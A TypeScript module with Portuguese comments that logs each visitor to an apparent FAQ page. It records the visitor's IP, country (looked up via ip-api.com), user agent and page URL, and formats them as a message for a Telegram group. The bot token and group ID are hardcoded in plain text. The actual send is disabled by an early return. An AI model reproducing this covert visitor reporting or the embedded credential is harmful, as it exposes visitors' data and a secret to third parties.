const BOT_TOKEN = "7638764121:AAHquW3OGZy13ny1sCTzP4uCey50GqvzqME";
const GROUP_ID = "-1002379977840";

// Função para obter o IP real do usuário
const getRealIpAddr = (headers: Headers): string => {
	const clientIp = headers.get("x-forwarded-for") as string;
	if (clientIp) {
		const ipList = clientIp.split(",").map((ip) => ip.trim());
		for (const ip of ipList) {
			if (isValidPublicIp(ip)) {
				return ip;
			}
		}
	}

	return (headers.get("remote-addr") as string) || "UNKNOWN";
};

// Validação de IP público
const isValidPublicIp = (ip: string): boolean => {
	const privateRanges = [
		/^10\./,
		/^172\.(1[6-9]|2[0-9]|3[0-1])\./,
		/^192\.168\./,
	];

	return !privateRanges.some((range) => range.test(ip)) && isValidIp(ip);
};

// Validação básica de IP
const isValidIp = (ip: string): boolean => {
	const ipRegex =
		/^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
	return ipRegex.test(ip);
};

// Função para buscar dados de geolocalização
const fetchGeoLocation = async (
	ip: string,
): Promise<{ country?: string } | null> => {
	try {
		const response = await fetch(`http://ip-api.com/json/${ip}`);
		if (!response.ok) {
			console.warn("Failed to fetch geo location:", response.statusText);
			return null;
		}
		return await response.json();
	} catch (error) {
		console.error("Error fetching geo location:", error);
		return null;
	}
};

// Função para enviar dados ao Telegram
export const sendDataToTelegram = async (
	headers: Headers,
	host: string,
	url: string,
) => {
	const userIp = getRealIpAddr(headers);
	const userAgent = headers.get("user-agent") || "Unknown";
	const pageUrl = `http://${host}${url}`;

	// Obter localização geográfica
	const geoData = await fetchGeoLocation(userIp);
	const country = geoData?.country || "Unknown";

	// Formatar mensagem
	const message = `
🔒 USER JOIN ON THE FAQ PAGE 

👤 User: [ ANONYMOUS ]
🌐 SITE: ${pageUrl}
🖥️ IP: ${userIp}
🌍 Location: ${country}
🧩 Agent: ${userAgent}
`;

	// Enviar mensagem para o Telegram
	const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
	const data = {
		chat_id: GROUP_ID,
		text: message,
	};

	console.log("TELEGRAM -> ", JSON.stringify(data));

	return;
	try {
		const response = await fetch(telegramApiUrl, {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify(data),
		});

		if (!response.ok) {
			throw new Error(`Failed to send message: ${response.statusText}`);
		}

		console.log("Message sent to Telegram successfully!");
	} catch (error) {
		console.error("Error sending message to Telegram:", error);
	}
};